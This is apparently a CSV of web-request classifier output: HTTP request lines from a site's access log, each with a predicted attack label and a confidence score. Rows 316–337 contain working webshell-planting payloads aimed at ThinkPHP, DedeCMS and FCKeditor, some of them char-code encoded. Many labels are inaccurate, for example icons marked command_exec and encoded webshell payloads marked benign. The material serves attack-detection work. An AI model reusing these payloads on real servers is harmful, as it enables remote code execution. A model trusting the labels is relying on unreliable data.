row_idx,text,pred_label,max_prob
221,METHOD=GET PATH=/self.logs/error.log.2018-04-22.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43003448843955994
222,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
223,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
224,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
225,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
226,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
227,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
228,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
229,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
230,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
231,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
232,METHOD=GET PATH=/domaindata/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7230401635169983
233,METHOD=GET PATH=/apple-touch-icon.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.37689048051834106
234,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
235,METHOD=GET PATH=/apple-touch-icon.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.37689048051834106
236,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
237,METHOD=GET PATH=/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7431632280349731
238,METHOD=GET PATH=/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7431632280349731
239,METHOD=GET PATH=/self.logs/error.log.2019-09-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4096969962120056
240,METHOD=GET PATH=/domaindata/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7230401635169983
241,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
242,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
243,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
244,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
245,METHOD=GET PATH=/domaindata/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7230401635169983
246,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
247,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
248,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
249,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
250,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
251,METHOD=GET PATH=/self.logs/access.log.2019-01-27.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45979568362236023
252,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
253,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
254,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
255,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,benign,0.4974004030227661
256,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,benign,0.4688447117805481
257,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,benign,0.4933105707168579
258,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,benign,0.4917145073413849
259,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,benign,0.5004051923751831
260,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,benign,0.4963632822036743
261,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,benign,0.48455244302749634
262,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,benign,0.48196008801460266
263,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,benign,0.480240136384964
264,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,benign,0.48653101921081543
265,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
266,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915
267,METHOD=GET PATH=/self.logs/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4057440757751465
268,METHOD=GET PATH=/self.logs/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4098285138607025
269,METHOD=GET PATH=/self.logs/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4299328923225403
270,METHOD=GET PATH=/self.logs/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4082556962966919
271,METHOD=GET PATH=/self.logs/2015/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43429169058799744
272,METHOD=GET PATH=/self.logs/2016/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42049384117126465
273,METHOD=GET PATH=/self.logs/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4384268522262573
274,METHOD=GET PATH=/self.logs/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4483668804168701
275,METHOD=GET PATH=/self.logs/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4019940197467804
276,METHOD=GET PATH=/self.logs/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44058606028556824
277,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
278,METHOD=GET PATH=/self.logs/2015/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4070121645927429
279,METHOD=GET PATH=/self.logs/2015/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.40792790055274963
280,METHOD=GET PATH=/self.logs/2015/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42459577322006226
281,METHOD=GET PATH=/self.logs/2015/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.40308234095573425
282,METHOD=GET PATH=/self.logs/2016/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.39524802565574646
283,METHOD=GET PATH=/self.logs/2016/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3962686061859131
284,METHOD=GET PATH=/self.logs/2016/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4135914444923401
285,METHOD=GET PATH=/self.logs/2016/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.393920361995697
286,METHOD=GET PATH=/self.logs/2015/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43751388788223267
287,METHOD=GET PATH=/self.logs/2015/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4450225234031677
288,METHOD=GET PATH=/self.logs/2015/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3942822217941284
289,METHOD=GET PATH=/self.logs/2015/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4375974237918854
290,METHOD=GET PATH=/self.logs/2016/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4225592315196991
291,METHOD=GET PATH=/self.logs/2016/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4275737702846527
292,METHOD=GET PATH=/self.logs/2016/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.38818758726119995
293,METHOD=GET PATH=/self.logs/2016/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42012807726860046
294,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
295,METHOD=GET PATH=/data QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5001644492149353
296,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1 QUERY= PROTOCOL=HTTP/1.1,benign,0.6136957406997681
297,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2 QUERY= PROTOCOL=HTTP/1.1,benign,0.6024762392044067
298,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377134680747986
299,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
300,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
301,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
302,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
303,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
304,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
305,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
306,METHOD=GET PATH=/self.logs/2016/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42049384117126465
307,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
308,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
309,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
310,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
311,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
312,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
313,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
314,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
315,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
316,METHOD=POST PATH=/FCKeditor/editor/filemanager/connectors/asp/connector.asp QUERY=Command=FileUpload&Type=File&CurrentFolder=%2F PROTOCOL=HTTP/1.1,command_exec,0.6429962515830994
317,METHOD=GET PATH=/index.php QUERY=m=member&c=index&a=register&siteid=1 PROTOCOL=HTTP/1.1,command_exec,0.42297330498695374
318,METHOD=POST PATH=/admin_aspcms/_system/AspCms_SiteSetting.asp QUERY= PROTOCOL=HTTP/1.1,command_exec,0.3469432294368744
319,METHOD=GET PATH=/plus/moon.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.44791358709335327
320,METHOD=POST PATH=/plus/90sec.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.42047426104545593
321,METHOD=POST PATH=/utility/convert/index.php QUERY=a=config&source=d7.2_x2.0 PROTOCOL=HTTP/1.1,command_exec,0.5237575173377991
322,METHOD=POST PATH=/utility/convert/data/config.inc.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.547547459602356
323,METHOD=GET PATH=/uploads/dede/sys_verifies.php QUERY=action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// PROTOCOL=HTTP/1.1,command_exec,0.8581370711326599
324,METHOD=POST PATH=/uploads/dede/sys_verifies.php QUERY=action=down PROTOCOL=HTTP/1.1,command_exec,0.8373600840568542
325,METHOD=POST PATH=/index.php/api/Uploadify/preview QUERY= PROTOCOL=HTTP/1.1,command_exec,0.623397171497345
326,METHOD=GET PATH=/user.php QUERY=act=login PROTOCOL=HTTP/1.1,command_exec,0.5571810603141785
327,METHOD=POST PATH=/fdgq.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.45104455947875977
328,"METHOD=GET PATH=/ QUERY=s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=ppeeu.php&content=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E PROTOCOL=HTTP/1.1",command_exec,0.7207354307174683
329,METHOD=POST PATH=/ppeeu.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45686331391334534
330,METHOD=GET PATH=/user.php QUERY=act=login PROTOCOL=HTTP/1.1,command_exec,0.5571810603141785
331,METHOD=POST PATH=/ysyqq.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41941767930984497
332,"METHOD=GET PATH=/ QUERY=s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=txual.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E$ PROTOCOL=HTTP/1.1",command_exec,0.6881241798400879
333,METHOD=POST PATH=/txual.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.44853901863098145
334,METHOD=GET PATH=/plus/mytag_js.php QUERY=dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=46&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=103&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=59&arrs2%5B%5D=64&arrs2%5B%5D=112&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=103&arrs2%5B%5D=95&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=112&arrs2%5B%5D=108&arrs2%5B%5D=97&arrs2%5B%5D=99&arrs2%5B%5D=101&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=47&arrs2%5B%5D=91&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=112&arrs2%5B%5D=121&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=104&arrs2%5B%5D=116&arrs2%5B%5D=93&arrs2%5B%5D=47&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=36&arrs2%5B%5D=95&arrs2%5B%5D=82&arrs2%5B%5D=69&arrs2%5B%5D=81&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=84&arrs2%5B%5D=91&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=93&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=114&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=63&arrs2%5B%5D=62&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=0 PROTOCOL=HTTP/1.1,benign,0.48952075839042664
335,METHOD=GET PATH=/plus/download.php QUERY=open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar PROTOCOL=HTTP/1.1,benign,0.4624825716018677
336,METHOD=POST PATH=/admin_aspcms/_system/AspCms_SiteSetting.asp QUERY= PROTOCOL=HTTP/1.1,command_exec,0.3469432294368744
337,METHOD=POST PATH=/e/DoInfo/ecms.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.4350149929523468
338,METHOD=GET PATH=/self.logs/access.log.2017-06-01.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4621824622154236
339,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
340,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
341,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
342,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
343,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
344,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
345,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
346,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
347,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
348,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
349,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
350,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
351,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
352,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
353,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
354,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
355,METHOD=GET PATH=/self.logs/error.log.2020-02-20 QUERY= PROTOCOL=HTTP/1.1,benign,0.4985811412334442
356,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
357,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,benign,0.48455244302749634
358,METHOD=GET PATH=/js/comment.css QUERY= PROTOCOL=HTTP/1.1,benign,0.4877049922943115
359,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
360,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
361,METHOD=GET PATH=/self.logs/access.log.2021-10-03.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45221012830734253
362,METHOD=GET PATH=/self.logs/error.log.2021-10-03.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42285412549972534
363,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
364,METHOD=GET PATH=/self.logs/access.log.2021-10-04.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45710331201553345
365,METHOD=GET PATH=/self.logs/access.log.2021-03-16.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43653756380081177
366,METHOD=GET PATH=/self.logs/error.log.2021-10-04.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4219733774662018
367,METHOD=GET PATH=/self.logs/access.log.2017-03-08.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44875040650367737
368,METHOD=GET PATH=/self.logs/access.log.2018-03-27.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45323556661605835
369,METHOD=GET PATH=/self.logs/error.log.2019-05-19.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42895588278770447
370,METHOD=GET PATH=/self.logs/error.log.2020-07-17 QUERY= PROTOCOL=HTTP/1.1,benign,0.5123015642166138
371,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
372,METHOD=GET PATH=/Datasets%20Description/Network/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5409043431282043
373,METHOD=GET PATH=/Datasets%20Description/Network/ssh.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5835829377174377
374,METHOD=GET PATH=/Datasets%20Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5646774172782898
375,METHOD=GET PATH=/auth.log/auth.log.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5544108152389526
376,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
377,METHOD=HEAD PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.6294333338737488
378,METHOD=GET PATH=/tg/tg_snort_full.7z QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4479665458202362
379,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
380,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
381,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
382,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
383,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
384,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
